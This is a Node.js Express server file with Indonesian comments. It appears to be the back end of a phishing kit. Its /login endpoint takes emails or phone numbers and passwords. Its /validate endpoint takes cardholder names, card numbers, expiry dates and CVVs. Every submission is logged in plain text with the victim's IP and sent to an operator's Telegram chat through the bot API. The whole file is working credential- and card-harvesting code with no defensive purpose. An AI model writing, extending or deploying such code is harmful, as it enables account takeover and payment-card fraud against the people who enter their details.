require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();

app.use(cors());
app.use(bodyParser.json());

// Fungsi untuk mengirim pesan ke Telegram
async function sendToTelegram(message) {
  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID; 
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    console.log('Message sent to Telegram successfully');
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

// Fungsi untuk menyimpan data login dan mengirim ke Telegram
function saveLoginData(emailOrMobile, password, ip, dateTime) {
  const logEntry = `Login || Time: ${dateTime} || IP: ${ip} || Email: ${emailOrMobile} || Password: ${password}\n`;

  fs.appendFile('loginData.txt', logEntry, (err) => {
    if (err) {
      console.error('Error saving login data:', err);
      return;
    }
    console.log('Login data saved.');
    sendToTelegram(logEntry); // Kirim log ke Telegram
  });
}

// Fungsi serupa untuk menyimpan data validasi dan mengirim ke Telegram
function saveValidationData(nameOnCard, cardNumber, expiry, cvv, ip, dateTime) {
  const logEntry = `Validation || Time: ${dateTime} || IP: ${ip} || Name on Card: ${nameOnCard} || Card Number: ${cardNumber} || Expiry: ${expiry} || CVV: ${cvv}\n`;

  fs.appendFile('loginData.txt', logEntry, (err) => {
    if (err) {
      console.error('Error saving validation data:', err);
      return;
    }
    console.log('Validation data saved.');
    sendToTelegram(logEntry); // Kirim log ke Telegram
  });
}

app.post('/login', (req, res) => {
  const { emailOrMobile, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const now = new Date();
  const dateTime = now.toLocaleString('en-US', { hour12: false });

  saveLoginData(emailOrMobile, password, ip, dateTime);

  res.send('Login data saved with IP and Time.');
});

app.post('/validate', (req, res) => {
  const { nameOnCard, cardNumber, expiry, cvv } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const now = new Date();
  const dateTime = now.toLocaleString('en-US', { hour12: false });

  saveValidationData(nameOnCard, cardNumber, expiry, cvv, ip, dateTime);

  res.send('Validation data saved.');
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  sendToTelegram(`Server is running on port ${PORT}`); // Memberitahu bot Telegram bahwa server sudah berjalan
});
